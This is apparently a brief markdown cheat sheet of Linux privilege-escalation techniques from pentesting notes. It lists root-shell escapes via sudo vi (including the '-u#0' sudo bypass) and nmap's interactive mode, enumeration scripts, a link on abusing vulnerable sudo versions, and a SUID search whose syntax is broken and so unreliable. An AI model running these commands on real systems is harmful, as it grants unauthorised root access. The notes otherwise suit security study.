
# Privilege Escalation

## Linux
* Run auto escalation checkers in the scripts folder
  * Mike_Czumak.py <--- python2 required
  * linuxExploitSuggester.sh

* Abuse commands allowed to run as root
  * These commands can be found in sudoers files
  * $> sudo -u#0 vi anything
  * :!sh

* nmap
  * $> sudo nmap --interactive
  * !bash

* find / type -f /4000


| Description | Link |
| ------------- | ----- |
| abuse sudo command | https://null-byte.wonderhowto.com/how-to/abuse-vulnerable-sudo-versions-get-root-0212024/ |
